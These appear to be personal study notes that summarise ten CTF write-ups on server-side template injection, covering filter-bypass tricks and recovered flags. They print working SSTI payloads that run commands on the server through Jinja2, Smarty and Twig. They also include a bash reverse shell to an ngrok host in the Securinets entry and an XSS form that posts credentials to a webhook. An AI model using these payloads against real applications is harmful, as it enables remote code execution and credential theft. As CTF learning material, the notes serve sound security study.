<h2>DarkCON CTF 2021 – DMM</h2>

Challenge:<br>
Please check it carefully
http://ssti.darkarmy.xyz/

So a URL is given, which clearly indicates SSTI.

Sending `http://ssti.darkarmy.xyz/?url={{7*7}}` gives

```python
<div style = "text-align:center">
<h1>Oops! 49 is 404 Not Found.</h1>
</div>
```

And after exploring a bit, we also have a blacklist: `%`, `[`, `]`, `"`, `+`, `_`, `self`, `request`, `join`, `config`.

From my Dunders Implementation file, I recently learnt that to see all the subclasses without an underscore, the following command could be run:

`{{ (dict.mro()[-1]|attr(%27\x5f\x5fsubclasses\x5f\x5f%27))() }}`

(The writeup author ran `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}`, which is practically the same thing.)

After running this, we see that `<class 'subprocess.Popen'>` is at position 407.

Running `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('id',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}`, we can see remote commands can be executed.

Hence the author ran:

-> `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}`

-> `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}`

Flag: darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}

Writeup: https://github.com/m3ssap0/CTF-Writeups/blob/master/DarkCON%20CTF%202021/DMM/README.md

<h2>1337 UP CTF — Smarty Pants</h2>

In this challenge, there's a regex filter (which I'm not going to type out cause its a bunch of mumbo jumbo). Anyway, the template engine being used here is Smarty. Using a command such as `{system(‘ls’)}` will give RCE, but its being filtered out by the regex. One thing the regex isn't filtering out is line breaks, and in Smarty, splitting the code between two lines does not render the code unusable. Using `{system(‘ls’)%0a}` to introduce a line break, the flag is printed.

Flag: INTIGRITI{php_4nd_1ts_many_f00tgun5}

Writeup: https://medium.com/@thewhitehatpanther/ssti-bypass-using-crlf-1337-up-ctf-smarty-pants-4ee8e1a72f98

<h2>csictf 2020 - The Usual Suspects</h2>

The challenge consists of a webpage where you can select some ice cream flavours from a drop down. It appears to be vulnerable to SSTI. 

Trying `{{config}}` lead to an error that showed us that the server used is Tornado, a Python web framework. To find the cookie_secret, they used tornado.web.Application, which makes application specific settings available to handlers without global variables. Cookie turned out to be `MangoDB`, and that was used to get the flag.

Flag: csictf{h3r3_i_4m}

Writeup: https://github.com/team0se7en/CTF-Writeups/blob/master/csictf2020/web/The_Usual_Suspects/README.md

<h2>PCTF ?? - ??</h2>

The webpage is SSTI vulnerable, and single-quotes are blocked. Okay so I now realize that in my Dunders Implementation, when single quotes were blocked, I went ahead and URL encoded them to bypass it ig? But that doesn't work in this case.

Payload used: `{{url_for.__globals__.os.popen(request.headers.hack).read()}}`

This is really quite clever. The payload uses headers to pass the specified commands, in this case, the header named hack which we can easily modify.

Flag: PCTF(wHOS7H47PoKEmoN)

Writeup: https://infosecwriteups.com/ssti-bypassing-single-quotes-filter-dc0ee4e4f011

<h2>Business CTF 2022 - Phishtale</h2>

The challenge consisted of a login page. The login details were given in the .env file. The page also had an /export endpoint that could only be accessed via localhost. It is also found that Varnish Cache was being used, which is a reverse proxy for catching HTTP.

This was subject to a request smuggling vulnerability. Also, there was a PHPSESSID cookie available. Using the crafted payload, the request was smuggled, and the phishing template was identified.

A following payload has to be sent which is vulnerable to SSTI, with Twig being the template language used.

By using the payload `{{['id',1]|sort('system')|join}}`, RCE is possible.

Final payload used is `{{['/readflag',1]|sort('system')|join}}` to get the flag.

Flag: HTB{5muggl3d_ph1sh_t0_54ndb0x_l4nd!}

Writeup: https://www.bulletproof.co.uk/blog/hack-the-box-2022-business-ctf-phish-tale-challenge

<h2>TokyoWesterns CTF 2018 - Shrine</h2>

A python Flask framework is being used, vulnerable to SSTI. It has a blacklist: `(`, `)`, `config`, `self`. In templates you have access to the config, request, session, and g objects, and the url_for() and get_flashed_messages() functions.

Using the payload `{{url_for.__globals__.current_app.config}}`, they were able to get the flag. I don't understand why config wasn't blacklisted in this case, but oh well.

Flag: TWCTF{pray_f0r_sacred_jinja2}

Writeup: https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f

<h2>Securinets CTF 2022 - Strong</h2>

SSTI vulnerable, filter: `re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)|\\\\",request.form['name'])`

So basically, `{{`, `}}`, `popen`, `os`, `subprocess`, `application`, `getitem`, `flag.txt`, `.`, `_`, `[`, `]`, `"`, `class`, `subclasses`, `mro`, `\\` are all blacklisted.

To bypass the `{{` and `}}`, `{% if PAYLOAD %}{% endif %}` can be used. 

To bypass `_`, 

```
POST /?__=a

...

name=... request|attr('args')|list|first ...
```

is used. I don't understand exactly what this is doing, I'll look into this.

Bypassing the class, subclasses, and getitem strings could be done by using the |lower function.

Final payload used:

```
POST /?__=a&.=b HTTP/1.1
Host: 128.199.3.34:1234
Content-Length: 661

name={% if ()|attr((request|attr('args')|list|first,'CLASS'|lower,request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'base',request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'SUBCLASSES'|lower,request|attr('args')|list|first)|join)()|attr((request|attr('args')|list|first,'GETITEM'|lower,request|attr('args')|list|first)|join)(276)(('bash -c ',request|attr('form')|list|last,'bash -i >%26 /dev/tcp/8',request|attr('args')|list|last,'tcp',request|attr('args')|list|last,'ngrok',request|attr('args')|list|last,'io/14003 0>%261',request|attr('form')|list|last)|join,shell=True,stdout=-1) %}{% endif %}&"
```

Writeup: https://ctf.zeyu2001.com/2022/securinets-ctf-finals-2022/strong

<h2>AngstromCTF 2023 - brokenlogin</h2>

The challenge is vulnerable to SSTI and XSS. There is a 25 character limit to the payload.

Character limit can be bypassed by `{{request.args.a|safe}}` to get the `a` query argument to bypass message argument limit.

XSS payload:
```html
<form action="https://webhook.url" method="POST">
    <label for="username">Username: </label>
    <input id="username" type="text" name="username" /><br /><br />

    <label for="password">Password: </label>
    <input id="password" type="password" name="password" /><br /><br />

    <input type="submit" />
</form>
```

I guess they just submitted the form to the form? Is this possible in all XSS form challenges? 

Flag: actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}

Writeup: https://hackmd.io/@Solderet/AngstromCTF2023

<h2>UMDCTF 2023 - pop calc</h2>

SSTI vulnerable calc webpage. Used the payload `{{ self._TemplateReference_context.namespace.__init__.__globals__.os.popen('cat flag.txt').read() }}` for RCE.

Writeup: https://www.youtube.com/watch?v=sAFxdUgmlds&ab_channel=RahulSinghChauhan

<h2>GACTF 2020 - SimpleFlask</h2>

Visiting the webpage and sending a POST request, we see its vulnerable to SSTI. `url_for`, `config`, `request`, `'`, `*`, `+`, `,`, `~`, `|`, `>`, `<` are blacklisted.

Important Payloads:

```python
__subclasses__()[127] = os._wrap_close
__subclasses__()[425] = subprocess.popen

1. name={{().__class__.__base__.__subclasses__()[127].__init__.__globals__}} #for os.system and os.popen
2. name={{().__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__}} #for open and read
3. name={{().__class__.__base__.__subclasses__()[425]("EVIL PAYLOAD GOES HERE")}}
```

Running the payload `{{().__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__.open("app.py").read()}}` resulted in a 500 error, whereas the individual components did not. So the blocklist applies to the output as well.

Using read() and readlines() gave 500, but using readline() did not as it read every individual line. Using a combination of sed and readline, they were able to piece together the app.py code, but ran into an error on line 14. They changed the casing of line 14 and deduced that a lowercase flag was triggering the 500 error.

Used `{{[].__class__.__base__.__subclasses__()[262].__init__.__globals__["o".__add__("s")].__dict__.listdir()}}` to get the list of all files and directories.

Used `{{().__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__.open("/fl".__add__("ag")).readline()}}` to get the flag.

Flag: GACTF{fac9165b6a2b5ac8bd3b99fad0619366}

Writeup: https://www.arashparsa.com/gactf/